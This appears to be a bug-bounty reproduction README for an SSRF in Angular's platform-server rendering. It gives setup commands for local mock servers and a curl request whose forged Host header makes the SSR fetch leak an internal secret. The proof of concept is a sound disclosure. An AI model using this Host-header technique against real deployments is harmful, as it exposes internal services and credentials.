# SSRF SSR Repro (Angular Platform-Server)

Goal: demonstrate SSR-time data fetch resolving against an attacker-controlled Host header.

## Setup
From repo root:

```bash
mkdir -p BugBounty/Repros/ssrf-ssr-app/node_modules/@angular
ln -sfn dist/packages-dist/common BugBounty/Repros/ssrf-ssr-app/node_modules/@angular/common
ln -sfn dist/packages-dist/core BugBounty/Repros/ssrf-ssr-app/node_modules/@angular/core
ln -sfn dist/packages-dist/platform-browser BugBounty/Repros/ssrf-ssr-app/node_modules/@angular/platform-browser
ln -sfn dist/packages-dist/platform-server BugBounty/Repros/ssrf-ssr-app/node_modules/@angular/platform-server
mkdir -p dist/packages-dist/node_modules/@angular
ln -sfn dist/packages-dist/common dist/packages-dist/node_modules/@angular/common
ln -sfn dist/packages-dist/core dist/packages-dist/node_modules/@angular/core
ln -sfn dist/packages-dist/platform-browser dist/packages-dist/node_modules/@angular/platform-browser
ln -sfn dist/packages-dist/platform-server dist/packages-dist/node_modules/@angular/platform-server
corepack pnpm ts-node --transpile-only --project BugBounty/Repros/ssrf-ssr-app/tsconfig.json BugBounty/Repros/ssrf-ssr-app/server.ts
```

This starts:
- Internal server: `http://127.0.0.1:4401/secret`
- SSR server: `http://127.0.0.1:4400/`

## Exploit demo
In another terminal:

```bash
curl -H 'Host: 127.0.0.1:4401' http://127.0.0.1:4400/
```

Expected outcome:
- The SSR response includes: `INTERNAL_SECRET_123`
- This shows SSR resolved a relative HttpClient request to the Host-controlled internal base.

## Notes
- This is a local, controlled repro using an internal mock service.
- No external network access is required.
